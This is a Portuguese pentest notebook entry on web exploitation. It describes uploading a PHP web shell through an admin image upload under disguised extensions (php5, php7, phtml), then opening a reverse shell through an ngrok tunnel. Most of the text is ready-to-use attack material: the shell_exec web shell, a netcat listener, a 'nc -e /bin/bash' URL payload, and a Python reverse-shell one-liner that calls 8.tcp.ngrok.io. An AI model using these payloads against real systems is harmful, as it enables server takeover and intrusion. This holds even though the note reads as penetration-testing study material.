---
tags:
  - Pentest
  - WEB
---
Para que ocorra essa exploração, é necessário que primeiro já tenha conseguido as *credenciais do admin* por meio da exploração do **xss** e sql **injection**.

# Criando código malicioso para upload

Por meio da linguagem de programação aceita pelo servidor, vamos criar um código que tenha como ser anexado no servidor de forma *mascada*, ultilizando extensões que não sejam barradas por ele. No caso do servidor PHP criaremos como uma extensão 

```shell
nano shell.php5
nano shell.php7
nano shell.phtml
```

- O arquivo malicioso deve ser escrito da seguinte forma:

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

- Após escrever, fazer o upload do arquivo na página do admin no lugar de uma imagem

- Para testar  os comandos e ver se o arquivo está funcionando, basta rodar qualquer comando do terminal,  -> vamos no diretório **onde se encontra o upload realizado**

# Shell Reversa

Para criar uma shell reversa no servidor, primeiro criaremos um túnel **TCP** com o ngrok para a porta **789** com o netcat:

```shell
nc -lvp 789

./ngrok tcp 789
```

- nc -lvp 789 - **Servidor** que receberá as requisições e será a shell reversa
- ./ngrok tcp 789 - **Túnel** do ngrok que irá apontar o servidor do alvo para o nosso servidor local.

Para saber se no servidor do alvo existe um binário do netcat que aceitará nossa conexão, vamos digitar o seguinte comando e ver o retorno:

```shell
cmd= which nc
```

Para finalmente criarmos a shell reversa, basta colar o seguinte comando na url:

```shell
shell.php5?cmd=nc 8.tcp.ngrok.io 12346 -e /bin/bash
```

- ``8.tcp.ngrok.io`` - Túnel
- `12346` - Porta
-  `-e /bin/bash` - comando para abrir o bash dentro do servidor 

Quando a conexão for estabelecida, já teremos tomado total controle ao servidor:
## Reverse Shell com Python
Também é possivel encontrar Shells Reversas já escritas em outras linguagens pelo github como é o caso do Python.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

#-> ("10.0.0.1",4242) - trocar pelo host e a porta do Ngrok:
#-> ("8.tcp.ngrok.io",12346)

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",12346));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Assim que colar na url, daremos mais um comando shell para expandir esse terminal:

```python
python -c "import pty;pty.spawn('/bin/bash')"
```



